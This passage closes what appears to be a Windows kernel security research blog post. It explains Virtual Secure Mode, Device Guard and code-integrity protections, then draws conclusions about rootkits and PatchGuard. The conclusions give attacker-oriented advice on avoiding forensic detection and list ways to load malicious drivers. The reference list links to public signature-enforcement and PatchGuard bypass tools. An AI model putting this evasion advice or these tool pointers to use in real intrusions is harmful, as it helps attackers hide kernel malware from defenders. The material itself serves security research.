+<p>As described <a href="https://docs.microsoft.com/en-gb/archive/blogs/ash/windows-10-device-guard-and-credential-guard-demystified">here</a>, <em>Virtual Secure Mode (VSM). VSM is a feature that leverages the virtualization extensions of the CPU to provide added security of data in memory.</em> (&hellip;) <em>VSM leverages the on chip virtualization extensions of the CPU to sequester critical processes and their memory against tampering from malicious entities.</em></p>
+<p>How is this different from the traditional model? Here, the hypervisor sits in between the hardware and the host (OS), abstracting the OS from the hardware.</p>
+<p><img src="/callbacks/image_thumb_079C780B.png" alt=""> - Microsoft copyrighted</p>
+<p><em>In this way, the VSM instance is segregated from the normal operating system functions and is protected by attempts to read information in that mode. The protections are hardware assisted, since the hypervisor is requesting the hardware treat those memory pages differently. This is the same way to two virtual machines on the same host cannot interact with each other; their memory is independent and hardware regulated to ensure each VM can only access its own data.</em></p>
+<p>Thanks to VSM (Virtual Secure Mode), Windows 10 comes with <a href="https://docs.microsoft.com/en-gb/archive/blogs/ash/windows-10-device-guard-and-credential-guard-demystified">Device Guard</a>. Device Guard is not a feature, but <em>a set of features designed to work together to prevent and eliminate untrusted code from running on a Windows 10 system.</em></p>
+<p>Among others, we now have a protected mode where &ldquo;sensitive&rdquo; operations can be run. And this is from where <a href="">Kernel Mode Code Integrity (KMCI)</a> and the hypervisor code integrity control itself, which is called <a href="">Hypervisor Code Integrity (HVCI)</a>, come from. Plus <a href="">Configurable Code Integrity (CCI)</a>, which <em>ensures that only trusted code runs from the boot loader onwards.</em></p>
+<p><a href="">Configurable Code Integrity (CCI)</a> allows the customization of a signature policy for user-mode and kernel code and protects the Windows OS from being compromised by &ldquo;bad&rdquo; drivers. Device Guard ensures the drivers are, at the least, signed by a known signature (<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/whql-test-signature-program">WHQL</a> signed). Additionally, you can further restrict the drivers by whitelisting them in the policy. In this way, Device Guard will block drivers from loading dynamic code and block any driver that is not on the whitelist.</p>
+<p>This is awesome and will mitigate the problem of bad actors bringing their own (known) vulnerable driver and exploit it. One thing to notice though is that, as of today, you&rsquo;ll barely find a system with VBS enabled. Even though most of the hardware already supports it, there are way too many incompatibilities (VMWare, VirtualBox, etc) and everyone is turning it off. The latest release of Windows already comes with it enabled but only for fresh installs. If you have been upgrading your system it will be disabled.</p>
+<h2 id="conclusions">Conclusions</h2>
+<p>This post only touches slightly on a small subset of the Windows Kernel Callbacks. The Windows Kernel has way more Callback mechanisms that are worth studying.</p>
+<p>Many people say rootkits are dead. Are they? When we talk about rootkits people usually think about &ldquo;hiding files&rdquo;, &ldquo;hiding processes&rdquo;, and a few other lame things. This doesn&rsquo;t make any sense. Rootkits are a path to something. Using a rootkit to hide a file, or a process is just &ldquo;stupid&rdquo;. There are many, many ways of doing things. Forensics tools will look at these things from multiple perspectives and they will catch you. You need to be smart. Remember <a href="https://en.wikipedia.org/wiki/Stuxnet">Stuxnet</a>? They actually made this mistake. If you don&rsquo;t know what mistake I&rsquo;m talking about, it is time for you to do your research.</p>
+<p>China, Russia, US, they all have kernel offensive capabilities. Today. People think PatchGuard solved an unsolvable problem. The trick is to learn how to live with PatchGuard, instead of trying to bypass it. If you do, the moment Microsoft finds out it will be patched. Look at <a href="https://github.com/everdox/InfinityHook">InfinityHook</a> for example (now patched). Also, if this subject interests you, make sure you look at the cool PatchGuard research from <a href="https://blog.tetrane.com/downloads/Tetrane_PatchGuard_Analysis_RS4_v1.01.pdf">Tetrane</a> (look at the references section below).</p>
+<p>The reason we don&rsquo;t see rootkits that often anymore it&rsquo;s because, in my opinion, the cost of developing malware for the Windows Kernel increased. To load drivers into the Windows Kernel you either need a stolen certificate, a zero-day exploit or bring your vulnerable driver (like we saw with the Gigabyte driver). The complexity has increased indeed. <code>Sc</code> also leaves a strong footprint, and persistence is tricky. However, there are ways around it. Remember <a href="https://en.wikipedia.org/wiki/DoublePulsar">DoublePulsar</a>? Do you know how it works?</p>
+<p>As we slightly saw, even though PatchGuard is fighting a battle it can&rsquo;t win, it is still quite interesting to study it. You can write a driver to emulate PatchGuard, and look at the same things PatchGuard is looking at.</p>
+<p>Ultimately, the addition of the secure kernel and VBS is an exciting step in modern OS architecture. And, at the same time, very annoying. Microsoft Windows is likely the most complex program ever created for a personal computer, <em>&quot;<a href="https://www.amazon.co.uk/Showstopper-Breakneck-Windows-Generation-Microsoft-ebook/dp/B00J5X5E9U/">no one mind can comprehend it all</a>&quot;</em>. That means this is a never-ending story, with many chapters yet to be written.</p>
+<p>To be continued.</p>
+<h2 id="unsorted-references">Unsorted References</h2>
+<ul>
+<li><a href="https://docs.microsoft.com/en-gb/archive/blogs/ash/windows-10-device-guard-and-credential-guard-demystified">https://docs.microsoft.com/en-gb/archive/blogs/ash/windows-10-device-guard-and-credential-guard-demystified</a></li>
+<li><a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/sal-annotations?view=vs-2019">https://docs.microsoft.com/en-us/cpp/c-runtime-library/sal-annotations?view=vs-2019</a></li>
+<li><a href="https://docs.microsoft.com/en-us/previous-versions/windows/hardware/design/dn653559(v=vs.85)">https://docs.microsoft.com/en-us/previous-versions/windows/hardware/design/dn653559(v=vs.85)</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/debugview">https://docs.microsoft.com/en-us/sysinternals/downloads/debugview</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">https://docs.microsoft.com/en-us/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw">https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry">https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea">https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing">https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode--ium--processes">https://docs.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode&ndash;ium&ndash;processes</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/wsl/faq">https://docs.microsoft.com/en-us/windows/wsl/faq</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-device-guard">https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-device-guard</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs">https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/aux_klib/nf-aux_klib-auxklibquerymoduleinformation">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/aux_klib/nf-aux_klib-auxklibquerymoduleinformation</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psremovecreatethreadnotifyroutine">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psremovecreatethreadnotifyroutine</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psremoveloadimagenotifyroutine">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psremoveloadimagenotifyroutine</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex2">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex2</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugging-using-windbg-preview">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugging-using-windbg-preview</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk">https://docs.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option">https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/whql-test-signature-program">https://docs.microsoft.com/en-us/windows-hardware/drivers/install/whql-test-signature-program</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/callback-objects">https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/callback-objects</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/test/hlk/testref/driver-compatibility-with-device-guard">https://docs.microsoft.com/en-us/windows-hardware/test/hlk/testref/driver-compatibility-with-device-guard</a></li>
+<li><a href="https://docs.microsoft.com/windows-hardware/drivers/ddi/ntddk/nc-ntddk-pcreate_process_notify_routine_ex">https://docs.microsoft.com/windows-hardware/drivers/ddi/ntddk/nc-ntddk-pcreate_process_notify_routine_ex</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/whql-release-signature">https://docs.microsoft.com/en-us/windows-hardware/drivers/install/whql-release-signature</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-policy--windows-vista-and-later-">https://docs.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-policy&ndash;windows-vista-and-later-</a></li>
+<li><a href="https://docs.microsoft.com/en-gb/windows-hardware/drivers/dashboard/get-a-code-signing-certificate">https://docs.microsoft.com/en-gb/windows-hardware/drivers/dashboard/get-a-code-signing-certificate</a></li>
+<li><a href="https://docs.microsoft.com/en-gb/windows-hardware/drivers/dashboard/register-for-the-hardware-program">https://docs.microsoft.com/en-gb/windows-hardware/drivers/dashboard/register-for-the-hardware-program</a></li>
+<li><a href="https://en.wikipedia.org/wiki/DoublePulsar">https://en.wikipedia.org/wiki/DoublePulsar</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Endpoint_Detection_and_Response">https://en.wikipedia.org/wiki/Endpoint_Detection_and_Response</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Fatal_system_error">https://en.wikipedia.org/wiki/Fatal_system_error</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Hooking">https://en.wikipedia.org/wiki/Hooking</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Hyper-V">https://en.wikipedia.org/wiki/Hyper-V</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Intel_Management_Engine">https://en.wikipedia.org/wiki/Intel_Management_Engine</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Kernel_Patch_Protection">https://en.wikipedia.org/wiki/Kernel_Patch_Protection</a></li>
+<li><a href="https://en.wikipedia.org/wiki/List_of_IOMMU-supporting_hardware">https://en.wikipedia.org/wiki/List_of_IOMMU-supporting_hardware</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Rootkit">https://en.wikipedia.org/wiki/Rootkit</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Stuxnet">https://en.wikipedia.org/wiki/Stuxnet</a></li>
+<li><a href="https://en.wikipedia.org/wiki/System_Service_Descriptor_Table">https://en.wikipedia.org/wiki/System_Service_Descriptor_Table</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Windows_Defender">https://en.wikipedia.org/wiki/Windows_Defender</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Windows_Vista">https://en.wikipedia.org/wiki/Windows_Vista</a></li>
+<li><a href="https://j00ru.vexillium.org/2010/06/insight-into-the-driver-signature-enforcement/">https://j00ru.vexillium.org/2010/06/insight-into-the-driver-signature-enforcement/</a></li>
+<li><a href="https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/">https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/</a></li>
+<li><a href="https://j00ru.vexillium.org/2012/11/defeating-windows-driver-signature-enforcement-part-1-default-drivers/">https://j00ru.vexillium.org/2012/11/defeating-windows-driver-signature-enforcement-part-1-default-drivers/</a></li>
+<li><a href="https://github.com/9176324/Shark">https://github.com/9176324/Shark</a></li>
+<li><a href="https://github.com/can1357/ByePg">https://github.com/can1357/ByePg</a></li>
+<li><a href="https://github.com/comaeio/SwishDbgExt">https://github.com/comaeio/SwishDbgExt</a></li>
+<li><a href="https://github.com/everdox/InfinityHook">https://github.com/everdox/InfinityHook</a></li>
+<li><a href="https://github.com/houseofxyz/injectAllTheThings">https://github.com/houseofxyz/injectAllTheThings</a></li>
+<li><a href="https://github.com/houseofxyz/threat-INTel/blob/master/2015/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf">https://github.com/houseofxyz/threat-INTel/blob/master/2015/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf</a></li>
+<li><a href="https://github.com/houseofxyz/wdk-header-files/blob/master/win10rs5/ntddk.h">https://github.com/houseofxyz/wdk-header-files/blob/master/win10rs5/ntddk.h</a></li>
+<li><a href="https://github.com/houseofxyz/windows-ps-callbacks-experiments">https://github.com/houseofxyz/windows-ps-callbacks-experiments</a></li>
+<li><a href="https://github.com/hfiref0x/DSEFix">https://github.com/hfiref0x/DSEFix</a></li>
+<li><a href="https://github.com/hfiref0x/KDU">https://github.com/hfiref0x/KDU</a></li>
+<li><a href="https://github.com/hfiref0x/KDU/tree/master/Source/Examples/BadRkDemo">https://github.com/hfiref0x/KDU/tree/master/Source/Examples/BadRkDemo</a></li>
+<li><a href="https://github.com/hfiref0x/Stryker">https://github.com/hfiref0x/Stryker</a></li>
+<li><a href="https://github.com/hfiref0x/TDL">https://github.com/hfiref0x/TDL</a></li>
+<li><a href="https://github.com/hfiref0x/UPGDSED">https://github.com/hfiref0x/UPGDSED</a></li>
+<li><a href="https://github.com/killvxk/DisableWin10PatchguardPoc">https://github.com/killvxk/DisableWin10PatchguardPoc</a></li>
+<li><a href="https://github.com/Mattiwatti/EfiGuard">https://github.com/Mattiwatti/EfiGuard</a></li>
+<li><a href="https://github.com/niemand-sec/AntiCheat-Testing-Framework">https://github.com/niemand-sec/AntiCheat-Testing-Framework</a></li>
+<li><a href="https://github.com/seporaitis/xv6-public/wiki/CPU-Registers-CR0">https://github.com/seporaitis/xv6-public/wiki/CPU-Registers-CR0</a></li>
+<li><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></li>
+<li><a href="https://github.com/tandasat/findpg">https://github.com/tandasat/findpg</a></li>
+<li><a href="https://github.com/tandasat/PgResarch">https://github.com/tandasat/PgResarch</a></li>
+<li><a href="https://github.com/zerosum0x0/puppetstrings">https://github.com/zerosum0x0/puppetstrings</a></li>
+<li><a href="https://github.com/zhuhuibeishadiao/PatchGuardResearch">https://github.com/zhuhuibeishadiao/PatchGuardResearch</a></li>
+<li><a href="http://codemachine.com/article_kernel_callback_functions.html">http://codemachine.com/article_kernel_callback_functions.html</a></li>
+<li><a href="http://deniable.org/windows/inject-all-the-things">http://deniable.org/windows/inject-all-the-things</a></li>
+<li><a href="http://standa-note.blogspot.com/2014/11/debugging-early-boot-stages-of-windows.html">http://standa-note.blogspot.com/2014/11/debugging-early-boot-stages-of-windows.html</a></li>
+<li><a href="http://standa-note.blogspot.com/2015/01/a-lst-of-patchguard-v81-related.html">http://standa-note.blogspot.com/2015/01/a-lst-of-patchguard-v81-related.html</a></li>
+<li><a href="http://standa-note.blogspot.com/2015/08/writing-hypervisor-for-kernel-mode-code.html">http://standa-note.blogspot.com/2015/08/writing-hypervisor-for-kernel-mode-code.html</a></li>
+<li><a href="http://standa-note.blogspot.com/2015/10/some-tips-to-analyze-patchguard.html">http://standa-note.blogspot.com/2015/10/some-tips-to-analyze-patchguard.html</a></li>
+<li><a href="http://www.capstone-engine.org/">http://www.capstone-engine.org/</a></li>
+<li><a href="https://zydis.re/">https://zydis.re/</a></li>
+<li><a href="http://www.nosuchcon.org/talks/2014/D2_01_Andrea_Allievi_Win8.1_Patch_protections.pdf">http://www.nosuchcon.org/talks/2014/D2_01_Andrea_Allievi_Win8.1_Patch_protections.pdf</a></li>
+<li><a href="http://www.powerofcommunity.net/poc2012/mj0011.pdf">http://www.powerofcommunity.net/poc2012/mj0011.pdf</a></li>
+<li><a href="http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/">http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/</a></li>
+<li><a href="http://www.uninformed.org/?v=3&amp;a=3">http://www.uninformed.org/?v=3&amp;a=3</a></li>
+<li><a href="http://www.uninformed.org/?v=6&amp;a=1&amp;t=sumry">http://www.uninformed.org/?v=6&amp;a=1&amp;t=sumry</a></li>
+<li><a href="http://www.uninformed.org/?v=all&amp;a=38&amp;t=sumry">http://www.uninformed.org/?v=all&amp;a=38&amp;t=sumry</a></li>
+<li><a href="http://uninformed.org/index.cgi?v=8&amp;a=5">http://uninformed.org/index.cgi?v=8&amp;a=5</a></li>
+<li><a href="https://blog.ensilo.com/windows-pssetloadimagenotifyroutine-callbacks-the-good-the-bad-and-the-unclear-part-1">https://blog.ensilo.com/windows-pssetloadimagenotifyroutine-callbacks-the-good-the-bad-and-the-unclear-part-1</a></li>
+<li><a href="https://blog.ensilo.com/windows-pssetloadimagenotifyroutine-callbacks-the-good-the-bad-and-the-unclear-part-2">https://blog.ensilo.com/windows-pssetloadimagenotifyroutine-callbacks-the-good-the-bad-and-the-unclear-part-2</a></li>
+<li><a href="https://blog.talosintelligence.com/2014/08/the-windows-81-kernel-patch-protection.html">https://blog.talosintelligence.com/2014/08/the-windows-81-kernel-patch-protection.html</a></li>
+<li><a href="https://blog.tetrane.com/downloads/Tetrane_PatchGuard_Analysis_RS4_v1.00.pdf">https://blog.tetrane.com/downloads/Tetrane_PatchGuard_Analysis_RS4_v1.00.pdf</a></li>
+<li><a href="https://blog.tetrane.com/downloads/Tetrane_PatchGuard_Analysis_RS4_v1.01.pdf">https://blog.tetrane.com/downloads/Tetrane_PatchGuard_Analysis_RS4_v1.01.pdf</a></li>
+<li><a href="https://code.google.com/archive/p/bypass-x64-dse/downloads">https://code.google.com/archive/p/bypass-x64-dse/downloads</a></li>
+<li><a href="https://csrc.nist.gov/CSRC/media/projects/cryptographic-module-validation-program/documents/security-policies/140sp1327.pdf">https://csrc.nist.gov/CSRC/media/projects/cryptographic-module-validation-program/documents/security-policies/140sp1327.pdf</a></li>
+<li><a href="https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk">https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk</a></li>
+<li><a href="https://forum.avast.com/index.php?topic=162445.60">https://forum.avast.com/index.php?topic=162445.60</a></li>
+<li><a href="https://githomelab.ru/pykd/pykd">https://githomelab.ru/pykd/pykd</a></li>
+<li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Desimone-Kernel-Mode-Threats-and-Practical-Defenses.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Desimone-Kernel-Mode-Threats-and-Practical-Defenses.pdf</a></li>
+<li><a href="http://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf">http://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf</a></li>
+<li><a href="https://leanpub.com/windowskernelprogramming">https://leanpub.com/windowskernelprogramming</a></li>
+<li><a href="https://medium.com/yarden-shafir/yes-more-callbacks-the-kernel-extension-mechanism-c7300119a37a">https://medium.com/yarden-shafir/yes-more-callbacks-the-kernel-extension-mechanism-c7300119a37a</a></li>
+<li><a href="https://os.kaspersky.com/products/kaspersky-secure-hypervisor/">https://os.kaspersky.com/products/kaspersky-secure-hypervisor/</a></li>
+<li><a href="https://processhacker.sourceforge.io/">https://processhacker.sourceforge.io/</a></li>
+<li><a href="https://securelist.com/elevation-of-privileges-in-namco-driver/83707/">https://securelist.com/elevation-of-privileges-in-namco-driver/83707/</a></li>
+<li><a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html</a></li>
+<li><a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtCreateThread.html">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtCreateThread.html</a></li>
+<li><a href="https://visualstudio.microsoft.com/vs/">https://visualstudio.microsoft.com/vs/</a></li>
+<li><a href="https://web.archive.org/web/20130413005705/http://www.saferbytes.it/2012/09/18/uefi-technology-say-hello-to-the-windows-8-bootkit/">https://web.archive.org/web/20130413005705/http://www.saferbytes.it/2012/09/18/uefi-technology-say-hello-to-the-windows-8-bootkit/</a></li>
+<li><a href="https://web.archive.org/web/20160417224229/http://www.vrtulex.net/download/ostatni/prirucky/kernel-data-filtering.pdf">https://web.archive.org/web/20160417224229/http://www.vrtulex.net/download/ostatni/prirucky/kernel-data-filtering.pdf</a></li>
+<li><a href="https://www.360totalsecurity.com/en/">https://www.360totalsecurity.com/en/</a></li>
+<li><a href="https://www.amazon.co.uk/Windows-Internals-Part-architecture-management/dp/0735684189/">https://www.amazon.co.uk/Windows-Internals-Part-architecture-management/dp/0735684189/</a></li>
+<li><a href="https://www.avast.com/en-gb/technology/malware-detection-and-blocking">https://www.avast.com/en-gb/technology/malware-detection-and-blocking</a></li>
+<li><a href="https://www.bitdefender.com/business/enterprise-products/hypervisor-introspection.html">https://www.bitdefender.com/business/enterprise-products/hypervisor-introspection.html</a></li>
+<li><a href="https://www.codemachine.com/article_kernel_callback_functions.html">https://www.codemachine.com/article_kernel_callback_functions.html</a></li>
+<li><a href="https://www.codeproject.com/Articles/28318/Bypassing-PatchGuard-3">https://www.codeproject.com/Articles/28318/Bypassing-PatchGuard-3</a></li>
+<li><a href="https://www.felixcloutier.com/x86/lea">https://www.felixcloutier.com/x86/lea</a></li>
+<li><a href="https://www.gaijin.at/en/infos/windows-version-numbers">https://www.gaijin.at/en/infos/windows-version-numbers</a></li>
+<li><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/eprocess/index.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/eprocess/index.htm</a></li>
+<li><a href="http://www.geoffchappell.com/notes/security/whqlsettings/index.htm">http://www.geoffchappell.com/notes/security/whqlsettings/index.htm</a></li>
+<li><a href="https://www.microsoft.com/">https://www.microsoft.com/</a></li>
+<li><a href="https://www.osronline.com/article.cfm%5Earticle=157.htm">https://www.osronline.com/article.cfm%5Earticle=157.htm</a></li>
+<li><a href="https://www.pcgamesn.com/street-fighter-v/sfv-capcom-rootkit-security">https://www.pcgamesn.com/street-fighter-v/sfv-capcom-rootkit-security</a></li>
+<li><a href="https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities">https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities</a></li>
+<li><a href="https://www.symantec.com/connect/blogs/reality-check-patchguard">https://www.symantec.com/connect/blogs/reality-check-patchguard</a></li>
+<li><a href="https://www.trendmicro.com/vinfo/pl/security/news/security-technology/windows-kernel-bug-found-can-be-abused-to-reportedly-bypass-security-systems">https://www.trendmicro.com/vinfo/pl/security/news/security-technology/windows-kernel-bug-found-can-be-abused-to-reportedly-bypass-security-systems</a></li>
+<li><a href="https://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html">https://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html</a></li>
+<li><a href="https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html">https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html</a></li>
+<li><a href="https://zerosum0x0.blogspot.com/2017/07/puppet-strings-dirty-secret-for-free.html">https://zerosum0x0.blogspot.com/2017/07/puppet-strings-dirty-secret-for-free.html</a></li>
+<li><a href="https://www.youtube.com/watch?v=85H4RvPGIX4">https://www.youtube.com/watch?v=85H4RvPGIX4</a></li>
+<li><a href="https://christopher-vella.com/2019/09/06/recent-edr-av-observations/">https://christopher-vella.com/2019/09/06/recent-edr-av-observations/</a></li>
+<li><a href="https://www.davidegrayson.com/signing/">https://www.davidegrayson.com/signing/</a></li>
+<li><a href="https://www.davidegrayson.com/signing/#kmod">https://www.davidegrayson.com/signing/#kmod</a></li>
+<li><a href="https://channel9.msdn.com/Events/Windows/Filter-Plugfest28/Driver-Certification-on-Windows-Client-and-Server">https://channel9.msdn.com/Events/Windows/Filter-Plugfest28/Driver-Certification-on-Windows-Client-and-Server</a></li>
+<li><a href="http://www.nynaeve.net/?p=111">http://www.nynaeve.net/?p=111</a></li>
+<li><a href="http://fyyre.ru/vault/bootloader.txt">http://fyyre.ru/vault/bootloader.txt</a></li>
+<li><a href="http://fyyre.ru/vault/bootloader_v2.txt">http://fyyre.ru/vault/bootloader_v2.txt</a></li>
+<li><a href="https://www.ptsecurity.com/upload/corporate/ru-ru/analytics/Windows_81_Kernel_Patch_Protection_Analysis.pdf">https://www.ptsecurity.com/upload/corporate/ru-ru/analytics/Windows_81_Kernel_Patch_Protection_Analysis.pdf</a></li>
+<li><a href="https://blog.talosintelligence.com/2014/08/the-windows-81-kernel-patch-protection.html">https://blog.talosintelligence.com/2014/08/the-windows-81-kernel-patch-protection.html</a></li>
+<li><a href="http://www.zer0mem.sk/?p=271">http://www.zer0mem.sk/?p=271</a></li>
+<li><a href="https://web.archive.org/web/20140824075154/https://www.mcafee.com/us/resources/reports/rp-defeating-patchguard.pdf">https://web.archive.org/web/20140824075154/https://www.mcafee.com/us/resources/reports/rp-defeating-patchguard.pdf</a></li>
+<li><a href="https://code.google.com/archive/p/easyhook-continuing-detours/wikis/PatchGuard.wiki">https://code.google.com/archive/p/easyhook-continuing-detours/wikis/PatchGuard.wiki</a></li>
+<li><a href="https://www.amazon.co.uk/Rootkit-Arsenal-Escape-Blunden-B/dp/1598220616/">The Rootkit Arsenal</a></li>
